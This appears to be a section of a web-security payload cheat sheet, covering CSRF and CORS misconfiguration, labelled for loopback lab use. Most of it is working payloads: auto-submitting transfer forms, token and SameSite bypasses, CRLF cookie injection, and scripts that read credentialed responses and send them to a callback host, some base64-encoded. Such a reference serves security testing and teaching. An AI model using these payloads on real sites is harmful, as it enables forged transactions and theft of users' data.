### 11.1. Basic GET & POST CSRF
*   **Identification / Signs**:
    *   *Notes*: Appears on functions that change state (such as password changes, fund transfers) without mechanisms protecting against CSRF, and the application relies entirely on the browser's default session cookies.
    *   *English rewrite*: Found on state-changing requests lacking CSRF tokens, relying solely on standard session cookies.

<!-- payload-id: CHEAT-11-001 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.1. Basic GET & POST CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable browser session increments the synthetic state counter once; the fixed endpoint requires a valid CSRF proof and leaves it unchanged -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Send a simulated GET CSRF request using curl
    curl "http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker"
    # Send a simulated POST CSRF request using curl
    curl -X POST -d "amount=1000&to=attacker" http://victim.lab.test/api/v1/transfer
    ```
*   **Suspicion / Testing**:
    *   *Notes*: Build a test HTML page containing tags that automatically send requests to the target application, then verify whether the request is executed successfully.
    *   *English rewrite*: Build a HTML test page that contains tags that automatically send requests to the target application to see if the requests are executed successfully.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-11-002 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.1. Basic GET & POST CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the vulnerable browser session increments the synthetic state counter once; the fixed endpoint requires a valid CSRF proof and leaves it unchanged -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. GET CSRF via Image tag -->
    <img src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" width="0" height="0" />

    <!-- 2. GET CSRF via Audio tag -->
    <audio src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" autoplay></audio>

    <!-- 3. GET CSRF via Video tag -->
    <video src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" autoplay></video>

    <!-- 4. GET CSRF via Link tag (pre-fetching resources) -->
    <link rel="prefetch" href="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" />

    <!-- 5. GET CSRF via Iframe tag -->
    <iframe src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" style="display:none;"></iframe>

    <!-- 6. Basic POST CSRF via HTML Form auto-submit -->
    <form id="csrfForm" action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 7. SameSite Lax Bypass via GET-to-POST method conversion (changing method to GET in form) -->
    <form id="csrfForm" action="http://victim.lab.test/api/v1/transfer" method="GET">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 8. POST CSRF via JavaScript fetch API (CORS must allow credentials) -->
    <script>
      fetch('http://victim.lab.test/api/v1/transfer', {
        method: 'POST',
        credentials: 'include',
        body: new URLSearchParams({amount: '1000', to: 'attacker'})
      });
    </script>

    <!-- 9. POST CSRF using multipart/form-data to bypass standard check -->
    <form id="csrfForm" action="http://victim.lab.test/api/v1/transfer" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 10. SameSite Lax Bypass via user interaction click coercion -->
    <a href="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" id="exploitLink">Claim Reward</a>
    <script>document.getElementById("exploitLink").click();</script>
```
*   **Automatic Tool**:
    *   *Notes*: Use the "Generate CSRF PoC" feature of Burp Suite Professional to quickly create the HTML exploit file.
    *   *English rewrite*: Use Burp Suite Professional's "Generate CSRF PoC" action in Engagement tools to automate exploit page setup.


---

### 11.2. Token Bypass CSRF
*   **Identification / Signs**:
    *   *Notes*: The application uses CSRF tokens, but the server's token verification mechanism has logical errors.
    *   *English rewrite*: CSRF tokens are implemented in parameters, but the server's validation logic contains vulnerabilities.

<!-- payload-id: CHEAT-11-003 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.2. Token Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: missing, empty, duplicated or cross-session tokens are rejected while the matching session-bound token succeeds -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Submit a request with the CSRF token parameter completely removed
    curl -X POST -d "amount=1000&to=attacker" http://victim.lab.test/api/v1/transfer
    # Submit a request with an empty CSRF token parameter
    curl -X POST -d "amount=1000&to=attacker&csrf_token=" http://victim.lab.test/api/v1/transfer
    ```
*   **Suspicion / Checking**:
    *   *Notes*: Try deleting the token parameter, sending an empty token, changing the request method, or trying to change the Content-Type.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-11-004 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.2. Token Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: missing, empty, duplicated or cross-session tokens are rejected while the matching session-bound token succeeds -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. CSRF Token parameter completely removed from request -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 2. CSRF Token provided with an empty value -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 3. Change request method from POST to GET to bypass token check -->
    <img src="http://victim.lab.test/api/v1/transfer?amount=1000&to=attacker" />

    <!-- 4. Swap csrf_token with another user's valid session token -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="VALID_TOKEN_FROM_OTHER_USER" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 5. Static or expired token reuse bypass -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="REUSED_STATIC_TOKEN" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 6. Token pattern guessing bypass using predictable timestamps or MD5 -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="c4ca4238a0b923820dcc509a6f75849b" /> <!-- MD5 of '1' -->
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 7. Swap content type from application/json to application/x-www-form-urlencoded -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 8. JSON CSRF with text/plain enctype (avoids preflight check) -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST" enctype="text/plain">
      <input type="hidden" name='{"amount": 1000, "to": "attacker", "dummy": "' value='test"}' />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 9. Historical/EOL note: Flash/Shockwave plugin CSRF bypasses are obsolete; do not use them for modern assessments. -->
    <!-- Keep this as a historical anti-pattern marker only, not as a modern test payload. -->

    <!-- 10. CSRF Token leak via Referer header extraction script -->
    <script>
      // Attacker site script extracting leaked token from history/referrer
      console.log("Leaked referrer: " + document.referrer);
    </script>
```
*   **Automatic tool**:
    *   *Notes*: Use Burp Suite Intruder to repeat requests to remove or modify token values automatically.
    *   *English rewrite*: Use Burp Suite Intruder to repeat requests to remove or modify token values automatically.


---

### 11.3. Cookie & Origin Bypass CSRF
*   **Identification / Indicators**:
    *   *Notes*: The application uses Double Submit Cookie protection mechanism or only checks Referer/Origin headers.
    *   *English rewrite*: Target application validates referer/origin headers or applies Double Submit Cookie protection.

<!-- payload-id: CHEAT-11-005 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.3. Cookie & Origin Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the fixed endpoint rejects untrusted/missing Origin and attacker-controlled double-submit values; only the valid same-origin control changes state -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Test Origin header bypass by modifying the Origin header in a request
    curl -H "Origin: http://callback.lab.test" -X POST -d "amount=1000&to=attacker" http://victim.lab.test/api/v1/transfer
    ```
*   **Suspicious / Testing**:
    *   *Notes*: Use XSS on subdomains to override cookies, or use the Referrer-Policy tag to hide the Referer header.
    *   *English rewrite*: Exploit XSS on subdomains to inject cookie strings or deploy meta tags to drop Referer headers.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-11-006 -->
<!-- context: Chromium 126 with HTTPS Express 4.19 victim/callback origins mapped to loopback; synthetic session cookie and one state-change counter; case: 11.3. Cookie & Origin Bypass CSRF -->
<!-- prerequisites: seed a synthetic authenticated session and reset the state counter before each browser case; do not use real accounts, transfers or external origins -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the fixed endpoint rejects untrusted/missing Origin and attacker-controlled double-submit values; only the valid same-origin control changes state -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Model a flawed double-submit comparison without changing browser cookies -->
    <script>
      document.body.dataset.sechubCandidateToken = "synthetic-token";
    </script>

    <!-- 2. Double Submit Cookie Bypass using CRLF injection to set cookie on target domain -->
    <a href="http://victim.lab.test/redirect?url=/%0d%0aSet-Cookie:%20csrf_token=attackertoken;%20Domain=.victim.lab.test">Set Token Cookie</a>

    <!-- 3. Referer header bypass via Referrer Policy Meta tag (suppressing Referer) -->
    <meta name="referrer" content="no-referrer" />
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 4. Referer header bypass via Regex Subdomain Spoofing -->
    <!-- Host this exploit file on: http://victim.lab.test.callback.lab.test/exploit.html -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 5. SameSite Lax Bypass via Open Redirect helper -->
    <script>
      window.location = "http://victim.lab.test/redirect?url=http://victim.lab.test/api/v1/transfer?amount=1000";
    </script>

    <!-- 6. Cross-Site WebSocket Hijacking (CSWSH) basic exploit -->
    <script>
      var ws = new WebSocket("ws://victim.lab.test/api/v1/chat");
      ws.onopen = function() { ws.send("Hello"); };
    </script>

    <!-- 7. Origin header spoofing using custom HTTP headers (for server-to-server proxies) -->
    <script>
      // Triggered on vulnerable node server proxying request
    </script>

    <!-- 8. Referer regex bypass containing path segment -->
    <!-- Host this file on: http://callback.lab.test/victim.lab.test/exploit.html -->
    <form action="http://victim.lab.test/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 9. CSWSH with origin validation bypass using custom subdomains -->
    <script>
      var ws = new WebSocket("ws://sub.victim.lab.test/api/v1/chat");
    </script>

    <!-- 10. SameSite Lax bypass via client-side cookie manipulation in target site -->
    <script>
      // Exploit page setting cookies dynamically before redirecting
    </script>
```
*   **Automatic tool**:
    *   *Notes*: Use Burp Suite Repeater to check the server's response when removing or changing the Origin/Referer header.
*   *English rewrite*: Use Burp Suite Repeater to verify server response when Origin or Referer header modifications are performed.

---

## References

- **[S1]** OWASP Cross-Site Request Forgery Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html — current version; accessed: 2026-07-18.

---

## 12. CORS Misconfiguration (Cross-Origin Resource Sharing)

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

CORS Misconfiguration occurs when the cross-origin resource sharing (CORS) policy is configured too loosely (for example: accepting any origin with credentials), allowing malicious websites to read users' sensitive data.

> **Related lesson:** [CORS](02-security-misconfiguration/cors/), [Lax Security Settings](02-security-misconfiguration/lax-security-settings/), [SSRF](01-broken-access-control/ssrf/).

### 12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials)
*   **Identification / Signs**:
    *   *Notes*: When sending a request with the `Origin: http://callback.lab.test` header, the server response contains `Access-Control-Allow-Origin: http://callback.lab.test` and `Access-Control-Allow-Credentials: true` headers.
    *   *English rewrite*: Server reflects arbitrary request `Origin` header values alongside the `Access-Control-Allow-Credentials: true` validation header.
*   **Suspicion / Testing**:
    *   *Notes*: Use curl to send a request containing a custom `Origin` header and check if the returned CORS header correctly reflects that domain.
    *   *English rewrite*: Issue a curl request with a custom `Origin` header and inspect HTTP headers in the response.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-12-001 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: attacker-origin JavaScript reads the synthetic marker only when arbitrary ACAO reflection and credentials are enabled; the fixed allowlist blocks exposure -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Basic dynamic origin reflection payload with credentials -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://victim.lab.test/api/v1/user", true);
      xhr.withCredentials = true;
      xhr.onload = function() {
        fetch("http://callback.lab.test/log?data=" + btoa(xhr.responseText));
      };
      xhr.send();
    </script>

    <!-- 2. Dynamic origin reflection using modern Fetch API -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + btoa(d)));
    </script>

    <!-- 3. Dynamic origin reflection targeting custom JSON profiles -->
    <script>
      var req = new XMLHttpRequest();
      req.open("GET", "http://victim.lab.test/api/v1/profile", true);
      req.withCredentials = true;
      req.onreadystatechange = function() {
        if (req.readyState == 4) {
          navigator.sendBeacon("http://callback.lab.test/log", req.responseText);
        }
      };
      req.send();
    </script>

    <!-- 4. Wildcard CORS extraction payload (no credentials, extracting public/static API) -->
    <script>
      fetch("http://victim.lab.test/api/v1/public-configs")
        .then(r => r.json())
        .then(d => console.log(d));
    </script>

    <!-- 5. Dynamic Origin reflection targeting admin logs -->
    <script>
      fetch("http://victim.lab.test/api/admin/logs", {credentials: "include"})
        .then(r => r.text())
        .then(t => new Image().src = "http://callback.lab.test/log?t=" + encodeURIComponent(t));
    </script>

    <!-- 6. Insecure HTTP origin allowed by HTTPS site -->
    <!-- Host this page on: http://insecure.lab.test/exploit.html -->
    <script>
      fetch("https://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(t => fetch("http://callback.lab.test/log?data=" + t));
    </script>

    <!-- 7. Dynamic reflection with custom authorization headers (if allowed by server) -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://victim.lab.test/api/v1/data", true);
      xhr.setRequestHeader("Authorization", "Bearer token");
      xhr.onload = function() { console.log(xhr.responseText); };
      xhr.send();
    </script>

    <!-- 8. Dynamic Origin reflection testing other HTTP verbs (e.g. PUT/DELETE) -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("PUT", "http://victim.lab.test/api/v1/settings", true);
      xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({email: "attacker@callback.lab.test"}));
    </script>

    <!-- 9. Dynamically reflective origin check on SOAP API responses -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://victim.lab.test/api/v1/soap", true);
      xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type", "text/xml");
      xhr.send("<soapenv:Envelope>...</soapenv:Envelope>");
    </script>

    <!-- 10. CORS reflection exploitation via custom frame messaging -->
    <script>
      window.addEventListener("message", function(e) {
        fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
          .then(r => r.text())
          .then(t => e.source.postMessage(t, e.origin));
      });
    </script>
```
*   **Automatic Tool**:
    *   *Notes*: Use Corsy to automatically scan for CORS errors related to dynamic Origin reflection.
    *   *English rewrite*: Run Corsy tool to scan target URLs for dynamic origin reflection vulnerabilities.<!-- payload-id: CHEAT-12-002 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: attacker-origin JavaScript reads the synthetic marker only when arbitrary ACAO reflection and credentials are enabled; the fixed allowlist blocks exposure; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    python corsy.py -u "http://victim.lab.test"
    ```


---

### 12.2. CORS Trust Bypass (Null Origin & Localhost Trust)
*   **Identification / Signs**:
    *   *Notes*: The target server is configured to accept `null` origin or fully trusts the localhost domain (`http://localhost`).
    *   *English rewrite*: Target application permits origin connections matching `null` or `localhost`.
*   **Suspicion / Verification**:
    *   *Notes*: Send a request with `Origin: null` or `Origin: http://localhost` headers and check if the CORS response allows it.
    *   *English rewrite*: Send `Origin: null` or `Origin: http://localhost` headers and check CORS permissions.
*   **Payloads (10 Payloads):**<!-- payload-id: CHEAT-12-003 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.2. CORS Trust Bypass (Null Origin & Localhost Trust) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: null/localhost origins are readable only in the deliberately vulnerable policy; exact-origin comparison in the fixed policy withholds ACAO -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Exploit CORS Null Origin via sandboxed iframe -->
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
      <script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://victim.lab.test/api/v1/user', true);
        xhr.withCredentials = true;
        xhr.onload = function() {
          fetch('http://callback.lab.test/log?data=' + btoa(xhr.responseText));
        };
        xhr.send();
      </script>
    "></iframe>

    <!-- 2. Exploit CORS Null Origin via Data URI Redirection -->
    <script>
      // Triggers browser redirection to data uri hosting the script
      // Redirection causes Origin header to be set to 'null'
      window.location = 'data:text/html;base64,PHNjcmlwdD52YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCdodHRwOi8vdmljdGltLmxhYi50ZXN0L2FwaS92MS91c2VyJyx0cnVlKTt4aHIud2l0aENyZWRlbnRpYWxzPXRydWU7eGhyLm9ubG9hZD1mdW5jdGlvbigpe2xvY2F0aW9uLmhyZWY9J2h0dHA6Ly9jYWxsYmFjay5sYWIudGVzdC9sb2c/ZGF0YT0nK2J0b2EoeGhyLnJlc3BvbnNlVGV4dCk7fTt4aHIuc2VuZCgpOzwvc2NyaXB0Pg==';
    </script>

    <!-- 3. Double sandboxed iframe helper to force Null Origin -->
    <iframe sandbox="allow-scripts" srcdoc="
      <iframe sandbox='allow-scripts' srcdoc='
        <script>
          fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
            .then(r => r.text())
            .then(d => parent.postMessage(d, "*"));
        </script>
      '></iframe>
    "></iframe>

    <!-- 4. Exploit Localhost Trust (standard HTTP) -->
    <!-- Host this script on attacker domain to fetch localhost resource -->
    <script>
      fetch("http://localhost:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log("Localhost data: " + d));
    </script>

    <!-- 5. Exploit Localhost Trust on custom port -->
    <script>
      fetch("http://localhost:8080/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 6. Exploit Localhost Trust on alternate loopback address -->
    <script>
      fetch("http://127.0.0.1:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 7. Exploit Localhost Trust using IPv6 loopback [::1] -->
    <script>
      fetch("http://[::1]:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 8. Sandboxed iframe dynamic creation to execute multiple Null Origin queries -->
    <script>
      var frame = document.createElement('iframe');
      frame.setAttribute('sandbox', 'allow-scripts');
      frame.srcdoc = '<script>fetch("http://victim.lab.test/api").then(r=>r.text()).then(t=>parent.postMessage(t,"*"))</script>';
      document.body.appendChild(frame);
    </script>

    <!-- 9. Null origin base64 data URI payload mapping image source -->
    <script>
      window.location = "data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPSJmZXRjaCgnaHR0cDovL3ZpY3RpbS5sYWIudGVzdC9hcGkvdjEvdXNlcicsIHtjcmVkZW50aWFsczonaW5jbHVkZSd9KS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGQ9PmZldGNoKCdodHRwOi8vY2FsbGJhY2subGFiLnRlc3QvJytkKSkiPg==";
    </script>

    <!-- 10. Local page file protocol load causing Null Origin -->
    <!-- file:// scheme sends Origin: null -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => alert("Saved file exploit: " + d));
    </script>
```
*   **Automated Tool**:
    *   *Notes*: Use curl to send a specific Origin value.
    *   *English rewrite*: Use curl command to quickly probe for local or null origin trust.<!-- payload-id: CHEAT-12-004 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.2. CORS Trust Bypass (Null Origin & Localhost Trust) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: null/localhost origins are readable only in the deliberately vulnerable policy; exact-origin comparison in the fixed policy withholds ACAO -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    curl -H "Origin: null" -I "http://victim.lab.test/api"
    curl -H "Origin: http://localhost" -I "http://victim.lab.test/api"
    ```


---

### 12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation)
*   **Detection / Signs**:
    *   *Notes*: The application's Origin filter uses loose regular expressions (Regex), allowing domains with suffixes or prefixes that match the real domain.
    *   *English rewrite*: Server validation regexes accept origins containing target domain strings as prefix/suffix.
*   **Suspicion / Testing**:
    *   *Notes*: Send requests with domains like `victim.lab.test.callback.lab.test` or `victim-lookalike.lab.test` and review the CORS response.
    *   *English rewrite*: Try domains like `victim.lab.test.callback.lab.test` or `victim-lookalike.lab.test` in the Origin header.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-12-005 -->
<!-- context: Chromium 126 and Express 4.19 with cors 2.8.5; victim and callback origins map to loopback and use a synthetic credentialed response marker; case: 12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation) -->
<!-- prerequisites: set fetch credentials mode and cookie SameSite/Secure policy explicitly, clear browser state and compare attacker versus allowlisted origins using the same endpoint -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: only the intentionally flawed regex/subdomain policy exposes the marker; canonical scheme-host-port comparison rejects every crafted origin -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```html
    <!-- 1. Regex Bypass: Suffix Match (Domain ending in victim.lab.test) -->
    <!-- Host this file on: http://attacker-victim.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 2. Regex Bypass: Subdomain Spoof (Domain starting with victim.lab.test) -->
    <!-- Host this file on: http://victim.lab.test.callback.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 3. Regex Bypass: Dot Unescaped (victim.lab.test matched as targetxcom) -->
    <!-- Host this file on: http://victim-lookalike.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 4. Regex Bypass: Special character insertion (e.g. victim.lab.test_callback.lab.test) -->
    <!-- Host this file on: http://victim.lab.test_callback.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 5. Regex Bypass: Using hyphen inside subdomain segment -->
    <!-- Host this file on: http://trusted-victim.lab.test.callback.lab.test/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 6. CORS Bypass via XSS on Trusted Subdomain -->
    <!-- If subdomain 'trusted.victim.lab.test' has XSS, inject this script there -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://callback.lab.test/log?data=" + d));
    </script>

    <!-- 7. CORS Bypass via XSS on trusted third-party CDN domain -->
    <!-- If target trusts 'trusted-cdn.lab.test' and it has XSS, load script there -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 8. URL encoding bypass in origin header (browser dependent) -->
    <script>
      // Sent with custom crafted Origin header containing %0d%0a or similar
    </script>

    <!-- 9. Suffix match bypass with custom port mapping -->
    <!-- Host this file on: http://attacker-victim.lab.test:8080/exploit.html -->
    <script>
      fetch("http://victim.lab.test/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 10. Advanced subdomain XSS combined with dynamic credentialed request -->
    <script>
      // Local marker: the browser harness separately verifies credential mode.
      document.body.dataset.sechubCorsMarker = "credentialed-response-readable";
    </script>
```
*   **Automatic Tool**:
    *   *Notes*: Use Corsy with a customized wordlist of domains to bypass regex.
    *   *English rewrite*: Run Corsy with a custom domain list to detect regex bypass errors.<!-- payload-id: CHEAT-12-006 -->
